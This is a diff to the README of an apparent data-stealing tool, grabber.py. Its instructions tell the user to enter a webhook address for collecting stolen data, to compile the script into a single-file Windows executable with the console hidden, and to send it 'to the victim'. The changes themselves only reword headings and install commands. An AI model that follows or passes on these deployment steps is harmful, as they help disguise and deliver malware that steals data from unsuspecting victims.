@@ -34,11 +34,12 @@ or normally download the ZIP file from **Code > Download ZIP**
 
 - 🚩 Open the `grabber.py` in a Text Editor **Notepad or better VSC** and edit the **__Webhook address and the name__**
 - 🚩 I recommend you to **convert** the script to .exe before sending it to the victim **(Tutorial below)**
-## 💾 How to Convert and Config
+- 
+## 💾 How to Convert
 - Install `auto-py-to-exe` with pip
 
 ```bash
-  pip install auto-py-to-exe
+  pip install auto-py-to-exe pyinstaller
 ```
 
 - Build the executable file (opens GUI)
@@ -46,7 +47,7 @@ or normally download the ZIP file from **Code > Download ZIP**
 ```bash
 auto-py-to-exe
 ```
-## ⚙️ EXE Configuration
+## ⚙️ How to config the .EXE
 - Select the path to the `grabber.py`
 - Select **ONEFILE** option! (--onefile)
 - Select **Hide the console** (--windowed)
